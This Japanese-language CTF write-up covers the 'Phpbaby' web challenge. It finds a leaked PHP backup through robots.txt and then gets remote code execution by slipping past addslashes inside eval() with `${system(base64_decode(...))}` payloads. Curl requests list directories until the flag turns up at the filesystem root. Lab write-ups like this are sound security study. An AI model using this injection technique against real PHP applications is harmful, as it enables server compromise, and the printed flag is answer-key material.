# Phpbaby:Web:528pts
Get the flag located at the root filesystem  
[Click here](https://ch3.sbug.se/)  

# Solution
アクセスすると何やらAAが動いているサイトだ。  
[site.png](site/site.png)  
ソースを見ると不審な点はなく、以下のコメントがあるだけだった。  
```bash
$ curl https://ch3.sbug.se/
~~~
<!-- Access To Source Code Is Not Allowed! -->
~~~
```
手始めに`/robots.txt`を見ると以下であった。  
```bash
$ curl https://ch3.sbug.se/robots.txt
user-agent: *
disallow: /Source_Code_Backup
```
`/Source_Code_Backup`にアクセスしてみると、リダイレクトの後ソースに以下があった。  
```bash
$ curl https://ch3.sbug.se/Source_Code_Backup -L
~~~
<!--
// Source Code Backup:
$SBCTF=@(string)$_GET['SBCTF'];
filter($boycott, $SBCTF);
eval('$SBCTF="'.addslashes($SBCTF).'";');
-->
```
addslashesを突破するのは簡単で変数展開を用い`${system(ls)}`などやれば任意のコードが実行できる。  
文字列の扱いに困った場合はbase64などをかけてやればよい。  
```bash
$ curl 'https://ch3.sbug.se/?SBCTF=$\{system(base64_decode(bHMg))\}'
<br />
<b>Warning</b>:  Use of undefined constant bHMg - assumed 'bHMg' (this will throw an Error in a future version of PHP) in <b>/var/www/html/index.php(15) : eval()'d code</b> on line <b>1</b><br />
SBCTF.png
Source_Code_Backup
abcs.png
index.php
lettercrap.css
lettercrap.js
robots.txt
~~~
$ curl 'https://ch3.sbug.se/?SBCTF=$\{system(base64_decode(bHMgLi4v))\}'
~~~
html
~~~
$ curl 'https://ch3.sbug.se/?SBCTF=$\{system(base64_decode(bHMgLi4vLi4v))\}'
~~~
backups
cache
lib
local
lock
log
mail
opt
run
spool
tmp
www
~~~
$ curl 'https://ch3.sbug.se/?SBCTF=$\{system(base64_decode(bHMgLi4vLi4vLi4v))\}'
~~~
SBCTF{eval_93da83d498872a4028dac140d1574290}
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
~~~
```
ルートにflagをファイル名としたものがあった。  

## SBCTF{eval_93da83d498872a4028dac140d1574290}